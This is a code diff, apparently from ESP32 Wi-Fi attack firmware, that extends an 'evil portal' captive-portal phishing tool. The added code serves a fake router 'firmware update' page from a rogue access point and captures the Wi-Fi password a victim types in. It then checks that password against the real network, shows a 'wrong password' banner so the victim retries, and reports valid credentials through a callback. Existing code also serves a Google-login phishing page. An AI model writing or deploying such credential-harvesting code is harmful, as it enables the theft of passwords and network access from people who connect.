@@ -21,6 +21,7 @@
 #define DNS_TASK_STACK 3072
 
 static volatile bool s_running = false;
+static volatile bool s_paused = false;
 static volatile bool s_dns_run = false;
 static bool s_bt_was_on = false;
 static bool s_event_handlers_registered = false;
@@ -59,6 +60,12 @@ static uint8_t s_channel = 1;
 
 static WifiHalEvilPortalCredCb s_cred_cb = NULL;
 static void* s_cred_cb_ctx = NULL;
+static WifiHalEvilPortalValidCb s_valid_cb = NULL;
+static void* s_valid_cb_ctx = NULL;
+static WifiHalEvilPortalBusyCb s_busy_cb = NULL;
+static void* s_busy_cb_ctx = NULL;
+static bool s_verify_creds_enabled = false;
+static volatile bool s_creds_already_valid = false;
 
 static char* s_html_buf = NULL;
 static size_t s_html_len = 0;
@@ -125,9 +132,15 @@ static void log_req_headers(httpd_req_t* req, const char* tag) {
     }
 }
 
+static void send_router_html(httpd_req_t* req, const char* error);
+
 static esp_err_t handler_root(httpd_req_t* req) {
     ESP_LOGI(TAG, "GET %s", req->uri);
     log_req_headers(req, "root");
+    if(s_verify_creds_enabled) {
+        send_router_html(req, NULL);
+        return ESP_OK;
+    }
     httpd_resp_set_type(req, "text/html");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
     httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
@@ -201,6 +214,67 @@ static void send_step2_with_email(httpd_req_t* req, const char* email) {
     httpd_resp_send_chunk(req, NULL, 0);
 }
 
+// Holds substitutions for placeholders in router/portal HTML.
+// Each pair is (marker, replacement). NULL marker terminates the array.
+typedef struct {
+    const char* marker;
+    const char* replacement;
+} HtmlSubst;
+
+static char* s_router_ssid_options = NULL; // <option> list, set before start
+
+static void send_html_with_substs(httpd_req_t* req, const char* html, const HtmlSubst* substs) {
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+
+    const char* p = html;
+    while(*p) {
+        const char* earliest = NULL;
+        const HtmlSubst* hit_subst = NULL;
+        for(const HtmlSubst* s = substs; s->marker; s++) {
+            const char* found = strstr(p, s->marker);
+            if(found && (!earliest || found < earliest)) {
+                earliest = found;
+                hit_subst = s;
+            }
+        }
+        if(!earliest) {
+            httpd_resp_send_chunk(req, p, strlen(p));
+            break;
+        }
+        if(earliest > p) httpd_resp_send_chunk(req, p, earliest - p);
+        if(hit_subst->replacement && hit_subst->replacement[0]) {
+            httpd_resp_send_chunk(req, hit_subst->replacement, strlen(hit_subst->replacement));
+        }
+        p = earliest + strlen(hit_subst->marker);
+    }
+    httpd_resp_send_chunk(req, NULL, 0);
+}
+
+static void send_router_html(httpd_req_t* req, const char* error) {
+    HtmlSubst substs[] = {
+        {"%ERROR%", error},
+        {"%SSID_OPTIONS%", s_router_ssid_options},
+        {NULL, NULL},
+    };
+    send_html_with_substs(req, EVIL_PORTAL_HTML_ROUTER, substs);
+}
+
+static const char EVIL_PORTAL_HTML_ROUTER_SUCCESS[] =
+    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
+    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
+    "<title>Update Complete</title>"
+    "<style>"
+    "body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f4;margin:0;padding:20px;color:#333}"
+    ".card{max-width:420px;margin:40px auto;background:#fff;border:1px solid #ddd;border-radius:6px;padding:24px;box-shadow:0 2px 4px rgba(0,0,0,.05);text-align:center}"
+    "h1{font-size:18px;margin:0 0 12px;color:#27ae60}"
+    "p{font-size:14px;line-height:1.5;margin:0 0 16px}"
+    "</style></head><body>"
+    "<div class=\"card\">"
+    "<h1>&#10004; Update Complete</h1>"
+    "<p>Your router will reconnect to the network shortly. You can close this page.</p>"
+    "</div></body></html>";
+
 static esp_err_t handler_post(httpd_req_t* req) {
     ESP_LOGI(TAG, "POST %s content_len=%u", req->uri, (unsigned)req->content_len);
     char body[512];
@@ -259,6 +333,33 @@ static esp_err_t handler_post(httpd_req_t* req) {
         if(s_cred_cb) s_cred_cb(user, pwd, s_cred_cb_ctx);
     }
 
+    // Router-template with verify enabled: try to associate with the entered
+    // creds against the real WLAN. Success -> notify UI + serve success page.
+    // Failure -> serve router HTML with an error banner so the victim retries.
+    if(s_verify_creds_enabled && step[0] == 0 && user[0] && pwd[0]) {
+        if(s_creds_already_valid) {
+            // Already captured a valid pair earlier; just acknowledge.
+            httpd_resp_send(
+                req, EVIL_PORTAL_HTML_ROUTER_SUCCESS, sizeof(EVIL_PORTAL_HTML_ROUTER_SUCCESS) - 1);
+            return ESP_OK;
+        }
+
+        if(s_busy_cb) s_busy_cb(true, "Verifying creds...", s_busy_cb_ctx);
+        bool ok = wifi_hal_evil_portal_verify_creds(user, pwd);
+        if(s_busy_cb) s_busy_cb(false, NULL, s_busy_cb_ctx);
+        ESP_LOGI(TAG, "verify '%s' -> %s", user, ok ? "VALID" : "INVALID");
+
+        if(ok) {
+            s_creds_already_valid = true;
+            if(s_valid_cb) s_valid_cb(user, pwd, s_valid_cb_ctx);
+            httpd_resp_send(
+                req, EVIL_PORTAL_HTML_ROUTER_SUCCESS, sizeof(EVIL_PORTAL_HTML_ROUTER_SUCCESS) - 1);
+        } else {
+            send_router_html(req, "Wrong password &mdash; please try again.");
+        }
+        return ESP_OK;
+    }
+
     if(strcmp(step, "2") == 0) {
         httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED, EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
     } else {
@@ -272,6 +373,10 @@ static esp_err_t handler_catch_all(httpd_req_t* req, httpd_err_code_t err) {
     (void)err;
     ESP_LOGI(TAG, "catch-all %s -> serve portal", req->uri);
     log_req_headers(req, "catch");
+    if(s_verify_creds_enabled) {
+        send_router_html(req, NULL);
+        return ESP_OK;
+    }
     httpd_resp_set_type(req, "text/html");
     httpd_resp_set_hdr(req, "Cache-Control", "no-store");
     httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
@@ -551,8 +656,9 @@ static void evil_portal_start_worker(void* arg) {
     ap_cfg.ap.max_connection = 4;
     ap_cfg.ap.beacon_interval = 100;
 
-    ESP_LOGI(TAG, "[worker] esp_wifi_set_mode(AP)");
-    err = esp_wifi_set_mode(WIFI_MODE_AP);
+    wifi_mode_t mode = cfg->verify_creds ? WIFI_MODE_APSTA : WIFI_MODE_AP;
+    ESP_LOGI(TAG, "[worker] esp_wifi_set_mode(%s)", cfg->verify_creds ? "APSTA" : "AP");
+    err = esp_wifi_set_mode(mode);
     if(err != ESP_OK) {
         ESP_LOGE(TAG, "  set_mode: %s", esp_err_to_name(err));
         esp_wifi_deinit();
@@ -603,7 +709,25 @@ static void evil_portal_start_worker(void* arg) {
     s_channel = ap_cfg.ap.channel;
     s_cred_cb = cfg->cred_cb;
     s_cred_cb_ctx = cfg->cred_cb_ctx;
+    s_valid_cb = cfg->valid_cb;
+    s_valid_cb_ctx = cfg->valid_cb_ctx;
+    s_busy_cb = cfg->busy_cb;
+    s_busy_cb_ctx = cfg->busy_cb_ctx;
+    s_verify_creds_enabled = cfg->verify_creds;
+    s_creds_already_valid = false;
     s_cred_count = 0;
+
+    if(s_router_ssid_options) {
+        free(s_router_ssid_options);
+        s_router_ssid_options = NULL;
+    }
+    if(cfg->router_ssid_options && cfg->router_ssid_options[0]) {
+        size_t n = strlen(cfg->router_ssid_options);
+        s_router_ssid_options = malloc(n + 1);
+        if(s_router_ssid_options) {
+            memcpy(s_router_ssid_options, cfg->router_ssid_options, n + 1);
+        }
+    }
 
     if(s_html_buf) {
         free(s_html_buf);
@@ -724,7 +848,18 @@ static void evil_portal_stop_worker(void* arg) {
     }
     s_cred_cb = NULL;
     s_cred_cb_ctx = NULL;
+    s_valid_cb = NULL;
+    s_valid_cb_ctx = NULL;
+    s_busy_cb = NULL;
+    s_busy_cb_ctx = NULL;
+    s_verify_creds_enabled = false;
+    s_creds_already_valid = false;
+    if(s_router_ssid_options) {
+        free(s_router_ssid_options);
+        s_router_ssid_options = NULL;
+    }
     s_running = false;
+    s_paused = false;
     ESP_LOGI(TAG, "[worker] Evil Portal STOPPED");
 }
 
@@ -771,4 +906,95 @@ uint16_t wifi_hal_evil_portal_get_client_count(void) {
     EpClientArgs a = {.count = 0};
     wifi_hal_run_in_worker(evil_portal_get_clients_worker, &a);
     return a.count;
+}
+
+typedef struct {
+    const char* ssid;
+    const char* pwd;
+    bool result;
+} EpVerifyArgs;
+
+static void evil_portal_verify_worker(void* arg) {
+    EpVerifyArgs* a = arg;
+    a->result = false;
+
+    wifi_config_t sta_cfg = {0};
+    strncpy((char*)sta_cfg.sta.ssid, a->ssid, sizeof(sta_cfg.sta.ssid) - 1);
+    strncpy((char*)sta_cfg.sta.password, a->pwd, sizeof(sta_cfg.sta.password) - 1);
+    sta_cfg.sta.threshold.authmode = WIFI_AUTH_OPEN;
+
+    ESP_LOGI(TAG, "[verify] connecting to '%s'...", a->ssid);
+
+    esp_wifi_disconnect();
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
+    if(err != ESP_OK) {
+        ESP_LOGE(TAG, "[verify]   set_config: %s", esp_err_to_name(err));
+        return;
+    }
+
+    err = esp_wifi_connect();
+    if(err != ESP_OK) {
+        ESP_LOGE(TAG, "[verify]   connect: %s", esp_err_to_name(err));
+        return;
+    }
+
+    // Poll for association: 12 x 500ms = 6s, mirrors Bruce's behavior.
+    wifi_ap_record_t info;
+    for(int i = 0; i < 12; i++) {
+        vTaskDelay(pdMS_TO_TICKS(500));
+        if(esp_wifi_sta_get_ap_info(&info) == ESP_OK) {
+            ESP_LOGI(TAG, "[verify]   connected after %d ticks", i + 1);
+            a->result = true;
+            break;
+        }
+    }
+
+    if(!a->result) {
+        ESP_LOGI(TAG, "[verify]   timeout, no association");
+    }
+
+    esp_wifi_disconnect();
+}
+
+bool wifi_hal_evil_portal_verify_creds(const char* ssid, const char* pwd) {
+    if(!s_running || !s_verify_creds_enabled || !ssid || !pwd) return false;
+    EpVerifyArgs a = {.ssid = ssid, .pwd = pwd, .result = false};
+    wifi_hal_run_in_worker(evil_portal_verify_worker, &a);
+    return a.result;
+}
+
+static void evil_portal_pause_worker(void* arg) {
+    (void)arg;
+    if(!s_running || s_paused) return;
+    ESP_LOGI(TAG, "[worker] pausing AP (esp_wifi_stop)");
+    esp_wifi_stop();
+    s_paused = true;
+}
+
+static void evil_portal_resume_worker(void* arg) {
+    (void)arg;
+    if(!s_running || !s_paused) return;
+    ESP_LOGI(TAG, "[worker] resuming AP (esp_wifi_start)");
+    esp_err_t err = esp_wifi_start();
+    if(err != ESP_OK) {
+        ESP_LOGE(TAG, "  wifi_start: %s", esp_err_to_name(err));
+        return;
+    }
+    s_paused = false;
+}
+
+void wifi_hal_evil_portal_pause(void) {
+    if(!s_running || s_paused) return;
+    wifi_hal_run_in_worker(evil_portal_pause_worker, NULL);
+}
+
+void wifi_hal_evil_portal_resume(void) {
+    if(!s_running || !s_paused) return;
+    wifi_hal_run_in_worker(evil_portal_resume_worker, NULL);
+}
+
+bool wifi_hal_evil_portal_is_paused(void) {
+    return s_paused;
 }
